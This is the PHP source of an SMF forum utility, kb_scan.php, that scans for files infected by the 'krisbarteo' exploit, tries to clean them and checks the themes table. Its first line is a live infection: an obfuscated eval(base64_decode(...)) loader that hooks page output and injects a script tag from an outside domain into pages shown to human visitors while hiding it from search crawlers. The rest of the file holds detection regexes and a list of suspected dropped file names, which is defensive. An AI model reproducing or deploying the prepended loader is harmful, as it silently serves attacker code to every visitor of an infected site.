<?php /**/ eval(base64_decode("aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21yX25vJ10pKXsgICAkR0xPQkFMU1snbXJfbm8nXT0xOyAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ21yb2JoJykpeyAgICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ2dtbCcpKXsgICAgIGZ1bmN0aW9uIGdtbCgpeyAgICAgIGlmICghc3RyaXN0cigkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sImdvb2dsZWJvdCIpJiYgKCFzdHJpc3RyKCRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXSwieWFob28iKSkpeyAgICAgICByZXR1cm4gYmFzZTY0X2RlY29kZSgiUEhOamNtbHdkQ0J6Y21NOUltaDBkSEE2THk5cGJtUmxjMmxuYm5OMGRXUnBiMmx1Wm04dVkyOXRMMnh6TG5Cb2NDSStQQzl6WTNKcGNIUSsiKTsgICAgICB9ICAgICAgcmV0dXJuICIiOyAgICAgfSAgICB9ICAgICAgICBpZighZnVuY3Rpb25fZXhpc3RzKCdnemRlY29kZScpKXsgICAgIGZ1bmN0aW9uIGd6ZGVjb2RlKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMpeyAgICAgICRSMzBCMkFCOERDMTQ5NkQwNkIyMzBBNzFEODk2MkFGNUQ9QG9yZChAc3Vic3RyKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMsMywxKSk7ICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOT0xMDsgICAgICAkUkEzRDUyRTUyQTQ4OTM2Q0RFMEY1MzU2QkIwODY1MkYyPTA7ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCY0KXsgICAgICAgJFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQj1AdW5wYWNrKCd2JyxzdWJzdHIoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QywxMCwyKSk7ICAgICAgICRSNjNCRURFNkIxOTI2NkQ0RUZFQUQwN0E0RDkxRTI5RUI9JFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQlsxXTsgICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSs9MiskUjYzQkVERTZCMTkyNjZENEVGRUFEMDdBNEQ5MUUyOUVCOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjgpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5PUBzdHJwb3MoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QyxjaHIoMCksJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSkrMTsgICAgICB9ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCYxNil7ICAgICAgICRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDk9QHN0cnBvcygkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLGNocigwKSwkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5KSsxOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjIpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5Kz0yOyAgICAgIH0gICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPUBnemluZmxhdGUoQHN1YnN0cigkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLCRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDkpKTsgICAgICBpZigkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPT09RkFMU0UpeyAgICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPSRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEM7ICAgICAgfSAgICAgIHJldHVybiAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzOyAgICAgfSAgICB9ICAgIGZ1bmN0aW9uIG1yb2JoKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpeyAgICAgSGVhZGVyKCdDb250ZW50LUVuY29kaW5nOiBub25lJyk7ICAgICAkUkExNzlBQkQzQTdCOUUyOEMzNjlGN0I1OUM1MUI4MURFPWd6ZGVjb2RlKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpOyAgICAgICBpZihwcmVnX21hdGNoKCcvXDxcL2JvZHkvc2knLCRSQTE3OUFCRDNBN0I5RTI4QzM2OUY3QjU5QzUxQjgxREUpKXsgICAgICByZXR1cm4gcHJlZ19yZXBsYWNlKCcvKFw8XC9ib2R5W15cPl0qXD4pL3NpJyxnbWwoKS4iXG4iLickMScsJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERSk7ICAgICB9ZWxzZXsgICAgICByZXR1cm4gJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERS5nbWwoKTsgICAgIH0gICAgfSAgICBvYl9zdGFydCgnbXJvYmgnKTsgICB9ICB9"));?>
<?php
/*********************************************************************************
* kb_scan.php                                                                    *
* ------------------------------------------------------------------------------ *
* This file can be used to check for file infections using the recent krisbarteo *
* exploit. If any infections are found, this should also be able to fix them.    *
**********************************************************************************
* Utility version:                1.0                                            *
* Utility by:                     Fustrate                                       *
* Testing:                        JBlaze                                         *
* Exploit Info:                   Sarge                                          *
* File Traversal:                 SlammedDime                                    *
* Detection Query:                SleePy                                         *
* ============================================================================== *
* Instructions: Upload this file to the root of your SMF installation, alongside *
* SSI.php and index.php, and navigate to it in your browser.                     *
*********************************************************************************/

if(file_exists(dirname(__FILE__) . '/SSI.php'))
	include_once(dirname(__FILE__) . '/SSI.php');
else
	die('<b>Error:</b> Cannot run - please verify you put this in the same place as SMF\'s index.php and SSI.php files.');

if (!$user_info['is_admin'])
	die('Admin privileges required.');

class FileChecker
{
	var $_dir = '';
	// Since the exploit also looks for phtml and php3, so do we.
	var $_include = array('php', 'phtml', 'php3');
	var $_results = array();

	function FileChecker()
	{
		$this->_dir = dirname(__FILE__);
	}

	function run()
	{
		set_time_limit(300);
		$this->_run($this->_dir);
	}

	function _run($file)
	{
		if (substr($file,-1) == '.')
			$file = substr($file,0,-1);

		if (is_file($file) && is_readable($file))
			return $this->_checkFile($file);
		elseif (!is_dir($file) || !$dir_handle = opendir($file))
		{
			trigger_error('Unable to open directory: ' . $file);
			return;
		}

		while(($filename = readdir($dir_handle)) !== false)
		{
			if (($filename == '.') || ($filename == '..'))
				continue;

			$extension = array_pop(explode('.', $filename));
			$real_path = $file . DIRECTORY_SEPARATOR . $filename;

			// Are we going to skip this file?
			$skip_file = (($this->_include !== false) && !in_array($extension, $this->_include)) ? true : false;

			if(is_file($real_path) && is_readable($real_path) && !$skip_file)
			{
				// No reason to scan this file, unless you infected it yourself...
				if ($filename === 'kb_scan.php')
					continue;

				$this->_checkFile($real_path);
			}
			elseif(is_dir($real_path))
				$this->_run($real_path);
		}
		closedir($dir_handle);
	}

	function _checkFile($filepath)
	{
		$contents = file($filepath);

		if (preg_match("~/\*\*/eval\(base64_decode\(~i", $contents[0]))
		{
			$results['infected'] = true;

			if (isset($_GET['fix']))
			{
				// We're going to do a straight preg_replace on the full contents
				$contents = implode("", $contents);

				// Stripsearch, err, strip the php eval
				$data = preg_replace("~<\?php /\*\*/eval\(base64_decode\('([a-zA-Z0-9+=/]+)'\)\); \?>\r?\n?~i", "", $contents);

				// Let's try to chmod the file to 755 or 777... 
				@chmod($filepath, 0755);

				$fp = @fopen($filepath, 'w');

				// Write it, or at least attempt to.
				if ($fp){
					fwrite($fp, $data);
					fclose($fp);
				}

				// Now try to reset permissions - 644 will be good, methinks.
				@chmod($filepath, 0644);

				$test = file($filepath);

				$results['fixed'] = !preg_match("~/\*\*/eval\(base64_decode\(~i", $test[0]);
			}
			else
				$results['fixed'] = false;
		}
		else
			$results = array(
				'infected' => false,
				'fixed' => true,
			);

		$base = basename($filepath);

		// A list of possible NEW files, taken from the exploit itself.
		$possibles = array('db.php', 'dg.php', 's.php', 'style.css.php', 'los.php', 'r0x.php');

		// Is this a potential exploit file? Also checks for fully numeric filenames and no-extension files.
		$results['possible'] = in_array($base, $possibles) || preg_replace("~([0-9]+)\.php~", "", $base) == '' || strpos($base, '.') === false;

		$this->_results[str_replace($this->_dir . '/', '', $filepath)] = $results;
	}

	function results()
	{
		if (empty($this->_results))
			return false;
		else
			return $this->_results;
	}
}

$file_test = new FileChecker();
$file_test->run();

$results = $file_test->results();

$checkDB = false;

// Let's check the database with SleePy's query...
if (!isset($_GET['noquery']) && isset($smcFunc))
{
	$result = $smcFunc['db_query']('', '
		SELECT t1.*
		FROM {db_prefix}themes AS t1
			LEFT JOIN {db_prefix}themes AS t2 ON (t1.id_theme = t2.id_theme)
		WHERE t1.id_member != 0 AND  t1.id_theme != t2.id_theme AND t1.id_member != t2.id_member AND t1.variable != t2.variable AND t2.id_theme != 0
		GROUP BY t2.id_member, t2.id_theme',
		array()
	);

	$checkDB = $smcFunc['db_num_rows']($result) > 0;

	$smcFunc['db_free_result']($result);
}
else if (!isset($_GET['noquery']))
{
	$result = db_query("
		SELECT t1.*
		FROM {$db_prefix}themes AS t1
			LEFT JOIN {$db_prefix}themes AS t2 ON (t1.ID_THEME = t2.ID_THEME)
		WHERE t1.ID_MEMBER != 0 AND  t1.ID_THEME != t2.ID_THEME AND t1.ID_MEMBER != t2.ID_MEMBER AND t1.variable != t2.variable AND t2.ID_THEME != 0
		GROUP BY t2.ID_MEMBER, t2.ID_THEME", __FILE__, __LINE__);

	$checkDB = mysql_num_rows($result) > 0;

	mysql_free_result($result);
}

echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
	<head>
		<title>SMF KB Scan Utility</title>
		<meta name="robots" content="noindex, nofollow" />
		<style type="text/css">
			body
			{
				background-color: #e5e5e8;
				margin: 0;
				padding: 0;
			}
			body, td
			{
				color: #000000;
				font-size: small;
				font-family: verdana, sans-serif;
			}
			div#header
			{
				background-image: url(Themes/default/images/catbg.jpg);
				background-repeat: repeat-x;
				background-color: #88a6c0;
				padding: 22px 4% 12px 4%;
				color: white;
				font-family: Georgia, serif;
				font-size: xx-large;
				border-bottom: 1px solid black;
				height: 40px;
			}
			div#content
			{
				padding: 20px 30px;
			}

			div.panel
			{
				border: 1px solid gray;
				background-color: #f6f6f6;
				margin: 1ex 0 3ex 0;
				padding: 1.2ex;
			}
			div.panel h2
			{
				margin: 0;
				margin-bottom: 2ex;
				padding-bottom: 3px;
				font-size: 14pt;
				font-weight: normal;
			}
			em
			{
				font-size: smaller;
			}
			table
			{
				border: 1px dotted black;
				border-top: none;
			}
			td
			{
				border-top: 1px dotted black;
			}
			.safe
			{
				background-color: #d1f7bf;
			}
			.infected
			{
				background-color: #ffbbbb;
				font-weight: bold;
			}
			.possible
			{
				background-color: #fdd7af;
				font-style: italic;
			}
			.example
			{
				border: 1px dotted black;
				padding: 5px;
			}
		</style>
	</head>
	<body>
		<div id="header">
			<div title="\'Fustrate is my hero!\' -JBlaze">SMF KB Scan Utility</div>
		</div>
		<div id="content">
			<div class="panel">
				<h2>Below are the results of the scan:</h2>
				<br />
				<span class="example safe" title="Uninfected">Uninfected</span> 
				<span class="example possible" title="This file might be from the exploit...">Possible</span> 
				<span class="example infected" title="This file is infected!">Infected!</span><br />
				<br />
				If this finds any infected files, <a href="kb_scan.php?fix">click here</a> to try to fix them. <strong>Make sure you back up your files before trying to fix anything!</strong><br />
				<br />';

if ($checkDB)
	echo '
				<div class="infected example">
					Please check your database - there is a good chance the themes table is infected!<br />
					Remember to make a backup before making any changes. This can either be done in your hosting control panel, or with the help of your host.
				</div>
				<br />';

echo '
				<table cellpadding="5" cellspacing="0" width="100%">';

// alphabetical order, shall we?
uksort($results, 'strnatcasecmp');

foreach($results as $name => $result)
{
	echo '
					<tr class="', ($result['infected'] && !$result['fixed']) ? 'infected' : ($result['possible'] ? 'possible' : 'safe'), '">
						<td>', $name, '</td>
						<td>
							', $result['infected'] ? ($result['fixed'] ? 'This file was cleaned.' : 'This file is infected!') : ($result['possible'] ? 'This file is a possible exploit.' : '&nbsp;'), '
						</td>
					</tr>';
}

echo '
				</table>
			</div>
		</div>
</body>
</html>';
?>